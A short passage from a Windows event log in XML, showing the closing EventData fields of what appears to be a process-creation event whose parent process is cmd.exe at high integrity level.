      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  